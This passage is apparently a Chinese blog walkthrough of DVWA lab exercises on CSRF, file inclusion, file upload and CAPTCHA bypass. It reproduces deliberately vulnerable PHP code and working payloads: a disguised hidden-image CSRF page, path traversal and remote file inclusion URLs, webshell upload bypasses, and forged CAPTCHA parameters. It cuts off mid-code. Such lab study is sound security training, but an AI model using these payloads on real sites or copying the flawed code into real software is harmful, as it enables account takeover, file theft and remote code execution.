<p>这个例子是上面的英文版描述。改变配置、强制提交信息、取消会员等危害。</p>
<p>CSRF是一种依赖web浏览器的、被混淆过的代理人攻击（deputy attack）</p>
<pre><code>CSRF攻击依赖下面的假定：
1 攻击者了解受害者所在的站点
2 攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie
3 目标站点没有对用户在网站行为的第二授权
</code></pre><p>low：</p>
<pre><code>&lt;?php 

if( isset( $_GET[ &#39;Change&#39; ] ) ) { 
// Get input 
$pass_new  = $_GET[ &#39;password_new&#39; ]; 
$pass_conf = $_GET[ &#39;password_conf&#39; ]; 

// Do the passwords match? 
if( $pass_new == $pass_conf ) { 
// They do! 
$pass_new = mysql_real_escape_string( $pass_new ); 
$pass_new = md5( $pass_new ); 

// Update the database 
$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; 
$result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

// Feedback for the user 
echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
} 
else { 
// Issue with passwords matching 
echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
} 

mysql_close(); 
} 

?&gt;
</code></pre><p>代码中在获取了$pass_new和$pass_conf这两个变量之后，利用mysql_real_escape_string()函数进行了过滤，这样虽然可以防止SQL注入，但却无法阻止CSRF攻击，之后这两个变量便被直接代入UPDATE语句中执行了数据库更新操作。</p>
<blockquote>
<p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制</p>
</blockquote>
<p>CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
<p>漏洞利用</p>
<p>1.<br><a href="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#" target="_blank" rel="external">http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成password</p>
<p>2.构造攻击页面</p>
<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p>
<pre><code>&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;
&lt;h1&gt;404&lt;h1&gt;

&lt;h2&gt;file not found.&lt;h2&gt;
</code></pre><p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack</p>
<p>Medium：</p>
<pre><code>&lt;?php 

if( isset( $_GET[ &#39;Change&#39; ] ) ) { 
// Checks to see where the request came from 
if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) ) { 
// Get input 
$pass_new  = $_GET[ &#39;password_new&#39; ]; 
$pass_conf = $_GET[ &#39;password_conf&#39; ]; 

// Do the passwords match? 
if( $pass_new == $pass_conf ) { 
// They do! 
$pass_new = mysql_real_escape_string( $pass_new ); 
$pass_new = md5( $pass_new ); 

// Update the database 
$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; 
$result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

// Feedback for the user 
echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
} 
else { 
// Issue with passwords matching 
echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
} 
} 
else { 
// Didn&#39;t come from a trusted source 
echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;; 
} 

mysql_close(); 
} 

?&gt; 
</code></pre><p>可以看到这里在获取$pass_new和$pass_conf这两个变量之前，先利用一个if语句来判断“$_SERVER[‘HTTP_REFERER’]”的值是否是127.0.0.1。这是一种基本的防御CSRF攻击的方法：验证HTTP Referer字段。我们可以再次使用之前的方法来实施CSRF攻击，可以发现已经不起作用了。下面就来解释一下这种防御方法的原理。</p>
<p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。比如下面这个利用Burpsuite拦截到的数据包，数据要提交到的页面是upfile_Other.asp，而我们是通过Referer字段后的<a href="http://192168.80.131/upload_Other.asp这个页面发起的请求。" target="_blank" rel="external">http://192168.80.131/upload_Other.asp这个页面发起的请求。</a></p>
<blockquote>
<p>根据Referer验证请求来源，绕过思路：在HTTP请求头声明Referer。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240213_708.png" alt=""></p>
</blockquote>
<p>High：</p>
<pre><code>&lt;?php 

if( isset( $_GET[ &#39;Change&#39; ] ) ) { 
// Check Anti-CSRF token 
checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 

// Get input 
$pass_new  = $_GET[ &#39;password_new&#39; ]; 
$pass_conf = $_GET[ &#39;password_conf&#39; ]; 

// Do the passwords match? 
if( $pass_new == $pass_conf ) { 
// They do! 
$pass_new = mysql_real_escape_string( $pass_new ); 
$pass_new = md5( $pass_new ); 

// Update the database 
$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; 
$result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

// Feedback for the user 
echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
} 
else { 
// Issue with passwords matching 
echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
} 

mysql_close(); 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt;
</code></pre><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<p>这里需要管理员首先输入当前密码，然后才能重新设置密码。这就是目前非常有效的一种防御CSRF攻击的方法：二次确认。<br>不会</p>
<p>impossible：</p>
<p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p>
<hr>
<h3 id="五：文件包含漏洞"><a href="#五：文件包含漏洞" class="headerlink" title="五：文件包含漏洞"></a>五：文件包含漏洞</h3><p>文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。<br>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见包含函数有：include()、require()<br>区别：</p>
<pre><code>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行
require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行
</code></pre><p>require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p>
<p>low：</p>
<pre><code>&lt;?php

// The page we wish to display
$file = $_GET[ &#39;page&#39; ];

?&gt; 
</code></pre><p>URL可发现，注入点在page，low等级直接注入<br><a href="http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile" target="_blank" rel="external">http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile</a><br>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241240_986.png" alt=""><br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br>成功进入服务器的php.ini文件<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241247_240.png" alt=""></p>
<p>构造url（相对路径）</p>
<pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpStudy\WWW\DVWA-1.9\php.ini
</code></pre><p>2.远程文件包含</p>
<p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
<p>在远程服务器192.168.5.12上传一个phpinfo.txt文件.<br>构造url</p>
<pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=http://192.168.5.12/phpinfo.txt
</code></pre><p>Medium:</p>
<p>&lt;php</p>
<p>//Thepagewewishtodisplay<br>$file=$_GET[‘page’];</p>
<p>//Inputvalidation<br>$file=str_replace(array(“<a href="http://&quot;,&quot;https://&quot;),&quot;&quot;,$file" target="_blank" rel="external">http://&quot;,&quot;https://&quot;),&quot;&quot;,$file</a>);<br>$file=str_replace(array(“../“,”..\””),””,$file);</p>
<p>&gt;</p>
<p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”<a href="https://”、" target="_blank" rel="external">https://”、</a> ” ../”、”..\”替换为空字符。</p>
<p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。<br>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
<p>paylaod:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a></p>
<p>远程文件包含:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt</a></p>
<p>High:</p>
<pre><code>&lt;php

//Thepagewewishtodisplay
$file=$_GET[&#39;page&#39;];

//Inputvalidation
if(!fnmatch(&quot;file*&quot;,$file)&amp;&amp;$file!=&quot;include.php&quot;){
   //Thisisn&#39;tthepagewewant!
echo&quot;ERROR:Filenotfound!&quot;;
exit;
}

&gt;
</code></pre><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
<p>思路：利用file协议绕过防护策略。<br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241306_740.png" alt=""><br>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p>
<p>Impossible：</p>
<pre><code>&lt;php
//Thepagewewishtodisplay
$file=$_GET[&#39;page&#39;];

//Onlyallowinclude.phporfile{1..3}.php
if($file!=&quot;include.php&quot;&amp;&amp;$file!=&quot;file1.php&quot;&amp;&amp;$file!=&quot;file2.php&quot;&amp;&amp;$file!=&quot;file3.php&quot;){
//Thisisn&#39;tthepagewewant!
echo&quot;ERROR:Filenotfound!&quot;;
exit;
}

&gt;
</code></pre><p>Impossible级别的代码使用了白名单机制进行防护，白名单算是目前最有效的防过滤手段。</p>
<p>柠檬师傅的总结：<br><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></p>
<h3 id="五：File-Upload"><a href="#五：File-Upload" class="headerlink" title="五：File Upload"></a>五：File Upload</h3><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241313_324.png" alt=""></p>
<p>Low：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
// Where are we going to be writing to? 
$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); 

// Can we move the file to the upload folder? 
if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { 
// No 
echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
} 
else { 
// Yes! 
echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
} 
} 

?&gt; 
</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241319_392.png" alt=""><br>连接菜刀getshell~<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241336_64.png" alt=""><br>Medium：</p>
<p>&lt;?php </p>
<pre><code>if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
// Where are we going to be writing to? 
$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); 

// File information 
$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; 
$uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; 
$uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; 

// Is it an image? 
if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; 
( $uploaded_size &lt; 100000 ) ) { 

// Can we move the file to the upload folder? 
if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { 
// No 
echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
} 
else { 
// Yes! 
echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
} 
} 
else { 
// Invalid file 
echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; 
} 
} 

?&gt;
</code></pre><p>查看源码，可发现代码限制了MIME类型和文件大小<br>if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp; ( $uploaded_size &lt; 100000 ) )<br>绕过思路，改一下MIME类型即可。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241343_499.png" alt=""><br>上传cmd.jpg文件，抓包。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241344_12.png" alt=""><br>尝试修改filename为hack.php。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241345_547.png" alt=""><br>上菜刀得到shell~</p>
<p>截断绕过规则</p>
<p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。</p>
<p>可以看到，包中的文件类型为image/png，可以通过文件类型检查。</p>
<p>High：</p>
<pre><code>

    &lt;?php 

    if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); 

    // File information 
    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); 
    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; 
    $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; 
    ( $uploaded_size &lt; 100000 ) &amp;&amp; 
    getimagesize( $uploaded_tmp ) ) { 

    // Can we move the file to the upload folder? 
    if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
    // No 
    echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
    } 
    else { 
    // Yes! 
    echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
    } 
    } 
    else { 
    // Invalid file 
    echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; 
    } 
    } 

    ?&gt;
</code></pre><p>可发现代码限制了后缀名，文件大小和用getimagesize检查文件头并判断文件大小</p>
<pre><code>&gt; // Is it an image? 
&gt; if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) )
</code></pre><p>strrpos(string,find,start)</p>
<p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p>
<p>getimagesize(string filename)</p>
<p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p>
<p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p>
<p>绕过思路：shell的后缀名改为jpg/jpeg/png，文件头插入jpg/png/gif的头部信息绕过getimagesize，<br>首先利用copy将一句话木马文件cmd.php与图片文件1.jpg合并Piccmd.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241425_841.png" alt=""></p>
<p>上菜刀得到shell</p>
<p>Impossible：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
// Check Anti-CSRF token 
checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 



// File information 
$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; 
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); 
$uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; 
$uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; 
$uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; 

// Where are we going to be writing to? 
$target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; 
//$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; 
$target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; 
$temp_file = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); 
$temp_file.= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; 

// Is it an image? 
if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; 
( $uploaded_size &lt; 100000 ) &amp;&amp; 
( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; 
getimagesize( $uploaded_tmp ) ) { 

// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
if( $uploaded_type == &#39;image/jpeg&#39; ) { 
$img = imagecreatefromjpeg( $uploaded_tmp ); 
imagejpeg( $img, $temp_file, 100); 
} 
else { 
$img = imagecreatefrompng( $uploaded_tmp ); 
imagepng( $img, $temp_file, 9); 
} 
imagedestroy( $img ); 

// Can we move the file to the web root from the temp folder? 
if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
// Yes! 
echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; 
} 
else { 
// No 
echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
} 

// Delete any temp files 
if( file_exists( $temp_file ) ) 
unlink( $temp_file ); 
} 
else { 
// Invalid file 
echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; 
} 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt;
</code></pre><p>该级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
<h3 id="七：Insecure-CAPTCHA"><a href="#七：Insecure-CAPTCHA" class="headerlink" title="七：Insecure CAPTCHA"></a>七：Insecure CAPTCHA</h3><p>reCAPTCHA验证流程</p>
<p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241444_780.jpg" alt=""></p>
<p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p>
<p>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</p>
<p>low：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { 
// Hide the CAPTCHA form 
$hide_form = true; 

// Get input 
$pass_new  = $_POST[ &#39;password_new&#39; ]; 
$pass_conf = $_POST[ &#39;password_conf&#39; ]; 

// Check CAPTCHA from 3rd party 
$resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], 
$_SERVER[ &#39;REMOTE_ADDR&#39; ], 
$_POST[ &#39;recaptcha_challenge_field&#39; ], 
$_POST[ &#39;recaptcha_response_field&#39; ] ); 

// Did the CAPTCHA fail? 
if( !$resp-&gt;is_valid ) { 
// What happens when the CAPTCHA was entered incorrectly 
$html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; 
$hide_form = false; 
return; 
} 
else { 
// CAPTCHA was correct. Do both new passwords match? 
if( $pass_new == $pass_conf ) { 
// Show next stage for the user 
echo &quot; 
&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; 
&lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; 
&lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; 
&lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; 
&lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; 
&lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; 
&lt;/form&gt;&quot;; 
} 
else { 
// Both new passwords do not match. 
$html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; 
$hide_form = false; 
} 
} 
} 

if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { 
// Hide the CAPTCHA form 
$hide_form = true; 

// Get input 
$pass_new  = $_POST[ &#39;password_new&#39; ]; 
$pass_conf = $_POST[ &#39;password_conf&#39; ]; 

// Check to see if both password match 
if( $pass_new == $pass_conf ) { 
// They do! 
$pass_new = mysql_real_escape_string( $pass_new ); 
$pass_new = md5( $pass_new ); 

// Update database 
$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; 
$result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

// Feedback for the end user 
echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
} 
else { 
// Issue with the passwords matching 
echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
$hide_form = false; 
} 

mysql_close(); 
} 

?&gt;
</code></pre><p>通过构造参数绕过验证过程的第一步<br>首先输入密码，点击Change按钮，抓包，更改step参数=2绕过验证码</p>
<p>Medium：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { 
// Hide the CAPTCHA form 
$hide_form = true; 

// Get input 
$pass_new  = $_POST[ &#39;password_new&#39; ]; 
$pass_conf = $_POST[ &#39;password_conf&#39; ]; 

// Check CAPTCHA from 3rd party 
$resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], 
$_SERVER[ &#39;REMOTE_ADDR&#39; ], 
$_POST[ &#39;recaptcha_challenge_field&#39; ], 
$_POST[ &#39;recaptcha_response_field&#39; ] ); 

// Did the CAPTCHA fail? 
if( !$resp-&gt;is_valid ) { 
// What happens when the CAPTCHA was entered incorrectly 
$html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; 
$hide_form = false; 
return; 
} 
else { 
// CAPTCHA was correct. Do both new passwords match? 
if( $pass_new == $pass_conf ) { 
// Show next stage for the user 
echo &quot; 
&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; 
&lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; 
&lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; 
&lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; 
&lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; 
&lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt; 
&lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; 
&lt;/form&gt;&quot;; 
} 
else { 
// Both new passwords do not match. 
$html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; 
$hide_form = false; 
} 
} 
} 

if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { 
// Hide the CAPTCHA form 
$hide_form = true; 

// Get input 
$pass_new  = $_POST[ &#39;password_new&#39; ]; 
$pass_conf = $_POST[ &#39;password_conf&#39; ]; 

// Check to see if they did stage 1 
if( !$_POST[ &#39;passed_captcha&#39; ] ) { 
$html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; 
$hide_form = false; 
return; 
} 

// Check to see if both password match 
if( $pass_new == $pass_conf ) { 
// They do! 
$pass_new = mysql_real_escape_string( $pass_new ); 
$pass_new = md5( $pass_new ); 

// Update database 
$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; 
$result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

// Feedback for the end user 
echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
} 
else { 
// Issue with the passwords matching 
echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
$hide_form = false; 
} 

mysql_close(); 
} 

?&gt;
</code></pre><p>Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码<br>&amp;passed_captcha=true</p>
<p>High：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Change&#39; ] ) ) { 
// Hide the CAPTCHA form 
$hide_form = true; 

// Get input 
$pass_new  = $_POST[ &#39;password_new&#39; ]; 
$pass_conf = $_POST[ &#39;password_conf&#39; ]; 

// Check CAPTCHA from 3rd party 
